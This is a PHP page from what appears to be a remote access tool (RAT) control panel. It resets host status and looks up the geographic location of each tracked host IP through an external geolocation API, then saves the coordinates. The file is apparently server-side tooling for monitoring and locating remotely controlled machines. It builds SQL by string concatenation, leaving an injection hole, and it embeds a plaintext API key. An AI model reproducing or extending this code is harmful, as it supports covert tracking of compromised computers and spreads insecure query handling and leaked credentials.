<?php
  # Necessary at the top of every page for session management
  session_start();

  # If the RAT user isn't authenticated
  if (!isset($_SESSION["authenticated"]))
  {
    # Redirects them to 403.php page
    header("Location: 403.php");
  }
  # Else they are authenticated
  else
  {
    # Includes the RAT configuration file
    include "config/config.php";

    # Establishes a connection to the RAT database
    # Uses variables from "config/config.php"
    # "SET NAMES utf8" is necessary to be Unicode-friendly
    $dbConnection = new PDO("mysql:host=$dbHost;dbname=$dbName", $dbUser, $dbPass, array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES utf8"));
  }
$statement = $dbConnection->prepare("UPDATE hosts SET status = 'disconnected'");
$statement->execute();


$statement = $dbConnection->prepare("SELECT * FROM hosts");
$statement->execute();
$results = $statement->fetchAll();

foreach ($results as $row)
{
  if($row["ip"] != "error"){
    $ip = $row['ip'];
    $url = "http://api.ipstack.com/". $row['ip']. "?access_key=c5687fbe022d00c079bd3ee8affd75ea&format=1";
    $my_var = file_get_contents($url);  
    
    $obj = json_decode($my_var);
    $latitude = $obj->{'latitude'};
    $longitude = $obj->{'longitude'};
    $position = $latitude. ", ". $longitude;
    $statement = $dbConnection->prepare("UPDATE hosts SET geoloc = '". $position. "' WHERE hostname = '".$row["hostname"]."'");
    $statement->execute();
  }

}
header('Refresh: 0; URL=network.php');
?>